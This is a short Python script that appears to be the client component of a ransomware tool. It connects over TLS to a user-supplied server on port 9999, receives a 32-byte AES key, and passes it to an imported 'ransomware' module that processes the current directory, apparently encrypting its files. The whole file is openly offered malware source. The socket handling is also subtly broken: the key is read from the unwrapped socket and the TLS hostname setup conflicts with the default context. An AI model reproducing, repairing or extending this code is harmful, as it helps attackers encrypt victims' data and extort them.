import socket
import ssl
import ransomware

def get_ip():
    return input("Enter the server ip: ")

def server_connection():
    context = ssl.create_default_context()
    client =  socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    secure_client = context.wrap_socket(client, server_hostname=None)
    ip = get_ip()
    while True:     
        try:
            secure_client.connect((ip, 9999))
            break
        except ConnectionError:
            ip = get_ip()
    key = client.recv(32)# aes key is 32 bytes
    ransomware.process_directory("",key)
    return None 

if __name__ == "__main__":
    server_connection()

    
    


